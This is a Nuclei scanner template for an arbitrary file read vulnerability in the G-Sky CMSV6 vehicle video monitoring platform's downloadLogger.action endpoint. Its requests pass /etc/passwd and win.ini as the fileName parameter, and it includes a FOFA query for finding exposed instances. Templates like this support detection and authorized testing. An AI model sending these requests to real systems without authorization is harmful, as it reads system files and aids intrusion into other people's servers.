id: gsky-cmsv6-downloadlogger-action-fileread
info:
  name: 通天星 CMSV6 车载视频监控平台 - downloadLogger.action - fileread
  author: leadlife
  severity: high
  description: 通天星CMSV6车载视频监控平台downloadLogger接口任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0downloadLogger%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: body="./open/webApi.html"||body="/808gps/"
  tags: g-sky,fileread


http:
  - method: GET
    path:
      - "{{BaseURL}}/808gps/logger/downloadLogger.action?fileName=/etc/passwd"
      - "{{BaseURL}}/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini"
    
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or
      
      - type: status
        status:
          - 200